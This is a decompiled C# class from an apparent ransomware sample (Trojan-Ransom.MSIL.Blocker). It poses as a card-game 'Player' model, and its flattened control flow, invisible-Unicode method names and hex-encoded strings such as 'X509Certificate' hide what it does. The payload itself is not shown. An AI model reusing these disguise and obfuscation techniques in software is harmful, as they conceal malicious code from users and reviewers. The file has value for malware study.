// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: BaseConfigHandl, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 8D741A15-4AC4-4AEF-B040-FB58D745B7BF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d821a006c277a3233bf056c5fcd528f49e8482ec7c153568c098d86915113f2c.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1242286786;
      bool flag1;
      string str1;
      string str2;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 933411990)) % 12U)
        {
          case 1:
            num1 = (int) num2 * -561931488 ^ 460384674;
            continue;
          case 2:
            str2 = str1;
            num1 = 409888887;
            continue;
          case 3:
            str1 = "7254385133624663";
            num1 = (int) num2 * -818077106 ^ 724304154;
            continue;
          case 4:
            str1 = (string) null;
            flag2 = BaseStream == 0;
            num1 = (int) num2 * -967805027 ^ -465028593;
            continue;
          case 5:
            int num3 = !flag2 ? 279100989 : (num3 = 1332408827);
            num1 = num3 ^ (int) num2 * -91316842;
            continue;
          case 6:
            str1 = "58353039436572746966696361";
            num1 = (int) num2 * 623823095 ^ -934898458;
            continue;
          case 7:
            goto label_1;
          case 8:
            num1 = (int) num2 * 1640914916 ^ 916028637;
            continue;
          case 9:
            flag1 = BaseStream == 1;
            num1 = 1016592592;
            continue;
          case 10:
            int num4 = !flag1 ? 793710528 : (num4 = 1131342226);
            num1 = num4 ^ (int) num2 * 1431217040;
            continue;
          case 11:
            num1 = (int) num2 * -448631255 ^ 1257283447;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 1294236259;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 1456288905)) % 5U)
        {
          case 1:
            num4 = 0;
            break;
          case 2:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 1803050269 ^ -1303786874;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num3 * -566694742 ^ -1283191147;
            continue;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = 1641864693;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = 501135675;
        int num3;
        bool flag;
        int index;
        int[] planningCards;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 1999971385)) % 15U)
          {
            case 1:
              flag = num3 > 0;
              num2 = (int) num4 * -637782733 ^ 1483871134;
              continue;
            case 2:
              num3 = planningCards[index];
              num2 = 75769442;
              continue;
            case 3:
              num2 = (int) num4 * -899267824 ^ 762468796;
              continue;
            case 4:
              int num5;
              num2 = num5 = index >= planningCards.Length ? 829089813 : (num5 = 1912039595);
              continue;
            case 5:
              num2 = (int) num4 * 303139483 ^ 1736493561;
              continue;
            case 6:
              ++index;
              num2 = (int) num4 * -2067633845 ^ -1358817842;
              continue;
            case 7:
              planningCards = this.PlanningCards;
              index = 0;
              num2 = (int) num4 * -2139025555 ^ 1920262567;
              continue;
            case 8:
              planningCardsCount = num1;
              num2 = (int) num4 * 1879372899 ^ -1828810912;
              continue;
            case 9:
              num2 = 1331157547;
              continue;
            case 10:
              num2 = (int) num4 * -693553972 ^ -2140544583;
              continue;
            case 11:
              int num6 = flag ? 1790238461 : (num6 = 1867290768);
              num2 = num6 ^ (int) num4 * 1107695322;
              continue;
            case 12:
              goto label_1;
            case 13:
              num2 = (int) num4 * 769660167 ^ 1818413672;
              continue;
            case 14:
              ++num1;
              num2 = (int) num4 * -2121267376 ^ -1447276626;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -454876229;
      int index;
      bool flag;
      int planningCard;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -917418746)) % 13U)
        {
          case 0:
            int num3 = flag ? 906693920 : (num3 = 723299595);
            num1 = num3 ^ (int) num2 * 993723163;
            continue;
          case 1:
            num1 = (int) num2 * -22538588 ^ 1109730010;
            continue;
          case 3:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * 438949917 ^ 1824499032;
            continue;
          case 4:
            goto label_1;
          case 5:
            str2 = str1;
            num1 = (int) num2 * -1405061852 ^ 360931199;
            continue;
          case 6:
            planningCard = this.PlanningCards[index];
            num1 = -1965426181;
            continue;
          case 7:
            num1 = (int) num2 * -486843156 ^ -683475657;
            continue;
          case 8:
            int num4 = planningCard == 0 ? -1232929411 : (num4 = -1552957502);
            num1 = num4 ^ (int) num2 * -1973745300;
            continue;
          case 9:
            flag = index < this.PlanningCards.Length;
            num1 = -989416199;
            continue;
          case 10:
            num1 = (int) num2 * 737003060 ^ -637124853;
            continue;
          case 11:
            ++index;
            num1 = -1975759898;
            continue;
          case 12:
            str1 = Player.\u206E‭‭‬‏⁭⁫‮‭⁭‮‫​‍‬‭‪‏⁭​‮‪‌⁫‎⁭‪‏⁯⁫‪⁯⁬⁮⁯​‫⁬‮‌‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1295304966;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1172743141;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 622846893)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -1136278702 ^ 1015668297;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1248162300;
      int count;
      int[] numArray;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -116026815)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 789469703 ^ 869971961;
            continue;
          case 2:
            numArray = new int[count];
            num1 = (int) num2 * 549384766 ^ 556699794;
            continue;
          case 4:
            planningCards = numArray;
            num1 = (int) num2 * -1179151316 ^ 515071899;
            continue;
          case 5:
            aIndex = 0;
            num1 = (int) num2 * -1753655677 ^ 57475358;
            continue;
          case 6:
            int num3;
            num1 = num3 = aIndex < count ? -1047696667 : (num3 = -212042956);
            continue;
          case 7:
            count = json.Count;
            num1 = (int) num2 * 496382261 ^ 475789410;
            continue;
          case 8:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -862249577;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u206A⁮‮⁪‏⁯⁬⁪⁫⁯⁫⁬‌⁫‎⁬‏⁮‌⁫⁫⁬⁯‭⁫‍‌‪‌⁮‬‎​⁮‎⁫⁯⁪‌‮‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = -1471304019;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -340621672)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -33626521 ^ 22752189;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u206E‭‭‬‏⁭⁫‮‭⁭‮‫​‍‬‭‪‏⁭​‮‪‌⁫‎⁭‪‏⁯⁫‪⁯⁬⁮⁯​‫⁬‮‌‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206A⁮‮⁪‏⁯⁬⁪⁫⁯⁫⁬‌⁫‎⁬‏⁮‌⁫⁫⁬⁯‭⁫‍‌‪‌⁮‬‎​⁮‎⁫⁯⁪‌‮‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
